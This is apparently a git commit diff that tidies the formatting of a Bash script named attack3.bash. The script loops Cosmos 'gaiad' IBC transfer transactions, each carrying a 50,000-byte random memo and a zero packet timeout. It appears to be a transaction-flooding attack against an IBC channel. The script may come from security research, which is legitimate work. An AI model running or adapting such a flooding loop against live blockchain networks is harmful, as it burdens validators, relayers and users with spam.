d8d38167b5579fbabf4ca37c6f924e589ae491c4
Jacob Gadikian <jacobgadikian@gmail.com>
2023-10-06 01:46:17 +0300

    more cleanliness

--- attack3.bash
+++ attack3.bash
@@ -9,9 +9,7 @@ do
 	gaiad tx ibc-transfer transfer transfer channel-58 cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 1uatom --from test3 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &2> attack3.log
 
 	# get sequence number if we've had an account sequence mismatch
-	if grep -q expected attack3.log ;
-
-	then
+	if grep -q expected attack3.log; then
 		echo "sequence mismatch at $i, getting new sequence number"
 		break
 	fi
@@ -26,7 +24,7 @@ done
 sequence () {
 
 SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 | jq --raw-output ' .account.sequence ')
-echo $SEQUENCE
+echo "new sequence number is $SEQUENCE"
 loop
 
 }
